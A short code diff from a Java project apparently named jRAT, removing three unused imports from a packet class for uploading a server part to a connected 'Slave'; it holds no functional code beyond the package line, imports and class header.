@@ -1,11 +1,8 @@
 package se.jrat.client.packets.outgoing;
 
 import java.io.DataOutputStream;
-import java.io.File;
 
 import se.jrat.client.Slave;
-import se.jrat.common.io.FileIO;
-import se.jrat.common.io.StringWriter;
 
 public class Packet104ServerUploadPart extends AbstractOutgoingPacket {
 	
